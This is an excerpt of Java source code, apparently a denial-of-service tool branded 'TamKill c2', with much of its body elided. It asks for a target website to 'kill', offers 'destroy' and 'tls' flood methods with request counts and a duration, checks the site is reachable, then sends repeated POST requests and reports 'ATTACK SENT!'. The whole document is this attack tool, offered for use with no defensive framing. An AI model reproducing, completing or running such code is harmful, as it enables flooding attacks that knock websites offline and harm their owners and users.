...
public class Dos implements Runnable {
    ...
    public static void main(String[] args) throws Exception {
        ...
        System.out.print("Please enter website you want kiXX !! :");
        url = in.nextLine();
        ...
        System.out.println("Welcome to TamKill c2");
        ...
        System.out.print("Methods :(destroy=8000000, tls=5000000) : ");
        ...
        System.out.print("Time:mặc định 1000000 : ");
    ...
    private void sslCheckConnection(String url) throws Exception {
        ...
        int responseCode = con.getResponseCode();
        if (responseCode == 200) {
            System.out.println("TamKill processing");
        }
        Dos.url = url;
    }
    ...
    private void postAttack(String url) throws Exception {
        ...
        wr.close();
        int responseCode = con.getResponseCode();
        System.out.println("TamKill Status: ATTACK SENT!" + this.seq);
    }
